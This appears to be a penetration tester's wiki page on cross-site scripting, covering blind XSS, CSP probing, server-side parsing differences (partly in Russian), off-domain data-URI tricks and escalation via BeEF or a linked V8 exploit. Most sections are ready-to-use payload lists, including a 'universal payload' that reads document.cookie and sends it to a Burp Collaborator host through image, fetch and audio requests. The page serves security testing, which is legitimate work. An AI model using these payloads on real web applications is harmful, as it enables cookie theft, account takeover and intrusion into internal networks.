## Reflected and stored
### HTML context

`<title>`, `<textarea>` and some other [[XSS#^196c9e]] tags don't render their content, so it's worth to close them first.
### JS context

### CSS context

### Client-side template injection
## Blind XSS

Blind XSS occures when a payload is rendered in another web application, which isn't available to an attacker to observe. These applications typically are backoffices, which aim is to aggregate leads from different forms and display them to managers. These forms are feedback forms, complaint forms, support tickets, rating functionality and any fields that may end up in an administration panel or debug message. You can spot them at landing websites which serves no other purpose rather than inviting you to fiil in a form.

A succesful injection is confirmed via a side channel, like Burp Collaborator, and tools like [XSS Hunter](https://xsshunter.com/) or [ezXSS](https://github.com/ssl/ezXSS), that collect as many data as possible, from a browser build to screenshots, and send them back to server.

Before injecting tools code in your payload, you need to confirm that none of discussed [[Browser security]] controls is stopping you.

Confirm an injection in HTML context with possible strict CSP in mind. You may need to try both HTTPS and HTTP schemes to omit mixed content problems.
```
"><img src=burpcollab> 
"><link rel=dns-prefetch href=burpcollab>
"><meta http-equiv="refresh" content="0;url=burpcollab">
"><style>@import'burpcollab'</style>
```
You also may want to try to break an existent context with a polyglot payload ahead:
```
'"></title></textarea></style></script>
```

Then probe for specific CSP directives:

| HTML Payload                              | Corresponding directive |
| ----------------------------------------- | ----------------------- |
| `"><img src=burpcollab>`                  | `img-src`               |
| `"><script src=burpcollab></script>`      | `script-src`            |
| `"><link rel=stylesheet href=burpcollab>` | `style-src`             |
| `"><video src=burpcollab>`                | `media-src`             |
| `"><iframe src=burpcollab>`               | `frame-src`             |
| `"><object data=burpcollab>`              | `object-src`            |
Establish exfiltration channel:

| HTML Payload                                                                                             | Corresponding directive |
| -------------------------------------------------------------------------------------------------------- | ----------------------- |
| `"><meta http-equiv="refresh" content="0;url=burpcollab">`                                               | `navigate-to`           |
| `"><svg onload=fetch('//burpcollab/',{mode:'no-cors'})>`                                                 | `connect-src`           |
| `"><style>@font-face{font-family:'x';src: url('//burpcollab/');}body{font-family:'x'!important}</style>` | `font-src`              |
| `"><link rel=dns-prefetch href=burpcollab>`                                                              | none                    |
Confirm inline JS execution rather than just cross-site request. To do so, first select the most permisive directive, chose an HTML tag which falls under it, then execute code in an attribute to make a request under that directive:

| JS Payload                                                                                                           | Tag                         |
| -------------------------------------------------------------------------------------------------------------------- | --------------------------- |
| `new Image().src='//burpcollab/'`                                                                                    | `<img>`                     |
| `new Image().src='//burpcollab/'`                                                                                    | `<iframe>`'s `srcdoc`       |
| `new Audio('//burpcollab/')`                                                                                         | `<source>` inside `<video>` |
| `fetch('//burpcollab',{mode:'no-cors'})`                                                                             | any                         |
| ```var l=document.createElement('link');l.rel='dns-prefetch';l.href='//.burpcollab';document.head.appendChild(l);``` | any                         |
| ```var v=document.createElement('video');v.src='//burpcollab/';document.body.appendChild(v)```                       | any                         |
| ```var l=document.createElement('link');l.rel='stylesheet';l.href='//burpcollab/';document.head.appendChild(l);```   | any                         |

Portswigger payload
```
</script><svg/onload='+/"/+/onmouseover=1/+(s=document.createElement(/script/.source), s.stack=Error().stack, s.src=(/,/+/burpcollab/).slice(2), document.documentElement.appendChild(s))//'>
```

Universal payload
```
"><details open ontoggle="
  var c=encodeURIComponent(document.cookie);
  new Image().src='//img.burpcollab/?'+c;
  fetch('//fetch.burpcollab/?'+c,{mode:'no-cors'});
  new Audio().src='//audio.burpcollab/?'+c;
">
```
## Server-side XSS

by [slonser](https://t.me/slonser_notes)

Содержимое этих тегов не обрабатывается как html теги: ^196c9e
```
iframe
noembed
noframes
noscript
plaintext
title
textarea
```
Соответственно при вводе:
```html
<textarea><a href="x></textarea><img src=x onerror=alert()//">
```
Результат парсинга на серверной стороне будет выглядеть следующим образом:
```html
textarea
a
  ->href: x></textarea><img src=x onerror=alert()//
```
В то время как в браузере это будет выглядеть следующим образом:
```html
<textarea>&lt;a href="x&gt;</textarea><img src="x" onerror="alert()//&quot;">
```

## Off-domain XSS

```
<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==">
```xml
<a src="data:javascript,alert(1)" href="javascript:alert(2)"></a>
<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>
<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>
<embed src="data:text/html;base64,%(base64)s">
```

## DOM XSS



## Leveraging

Tunneling into internal networks is possible via [BeEF (The Browser Exploitation Framework)](https://github.com/beefproject/beef) payload. To achieve this in modern browsers, several criteria must be met:
- `XMLHttpRequest` and `fetch` responses are restricted by SOP, so there should be a CORS misconfiguration at the target website
- Mixed Content blocking restricts visiting HTTPS resources from HTTP resources and vice-versa, so request is only possible to the same protocol
- CSP is absent or `connect-src` is not present, otherwise the connection is possible only to the resources which mentioned in the directive
  
So-called "session riding" applies additional restrictions to those described above:
- ACAO header is reflected by the target web-server, ACAC header is presented and set to true
- SameSite attribute is explicitly set to None
- Domain attribute explicitly allows target web server, Path attribute is not set or configured loosely (i.e., "/")

While session riding seems to be highly unlikely in modern environments, general tunneling is still possible due to a usual lack of security in internal networks. Even where CORS is not permissive, blind request-based attacks (triggering actions, network discovery via timing side-channels) remain possible.

Misconfigured JavascriptInterface in Android WebViews may esaclate XSS to LFR or RCE.

When an XSS is chained with a sandbox bypass exploit, it can lead to intial access to the underlying device OS ([[Browser security]]). An example of such exploit is [CVE-2021-30632](https://github.com/CrackerCat/CVE-2021-30632/blob/main/CVE-2021-30632.html), use-after-free in V8, explained in [Chrome in-the-wild bug analysis](https://github.blog/security/vulnerability-research/chrome-in-the-wild-bug-analysis-cve-2021-30632/).